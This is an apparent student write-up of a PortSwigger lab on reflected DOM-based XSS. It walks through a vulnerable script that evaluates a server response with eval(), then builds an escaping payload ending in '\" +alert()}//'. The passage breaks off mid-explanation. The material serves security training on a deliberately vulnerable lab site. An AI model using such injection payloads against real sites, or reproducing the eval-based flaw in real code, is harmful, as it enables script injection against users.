# Lab: Reflected DOM XSS
# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

```bash
# Open burp suite and search abc1234 at lab and open network inside web console.
# Check Target section at burp suite open details in url you will find resources inside there.
# Open Js folder and open searchResults.js.(If you can't open it resend it from network inside web console)
# After that you will be able to open it and check it's response.

   var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };

# eval() function evaluates JavaScript code represented as a string and returns its completition value. The source is parsed as script.

```
```bash
# Open search-results and click on search=abc1234
Request: GET /search-results?search=abc1234 HTTP/2
Response: {"results":[],"searchTerm":"abc1234"}

# It basicly sends abc1234 searchResults.js and gets back the result.
# We will use it send this request to repeater.
```
```bash
abc1234 " alert()

# Response: {"results":[],"searchTerm":"abc1234 \" alert()"}

# The backslash before the quotation mark \" is escaping the quotation mark
# so that it is included as part of the string value rather than being interpreted as the end of the string.
# Backslashes (\): These are used as escape characters themselves. To include an actual backslash in a string, you would write \\.

abc1234 \" alert()

# Response: "searchTerm":"abc1234\\" alert()"
```
```bash
abc1234 \" alert()} //

# Response: "searchTerm":"abc1234\\" alert()}//"}

# We added // part to comment out "} part and we add } to complete "searchTerm": part.
# Now we need 1 last thing + or -. They both work.

abc1234\" +alert()}//

# The reason we need + or -:

# String Concatenation: The + in JavaScript is used for string concatenation. When you include +alert(), it suggests that alert() is being treated as a part of a concatenation operation, which helps in forming a valid JavaScript expression.

# JavaScript Parsing: Without the +, alert() is treated as a separate statement which might not get executed depending on the context of the generated JavaScript code in the response.

# The reason the + is necessary for alert() to execute lies in how the server processes and returns the input, and how the browser parses it:
```

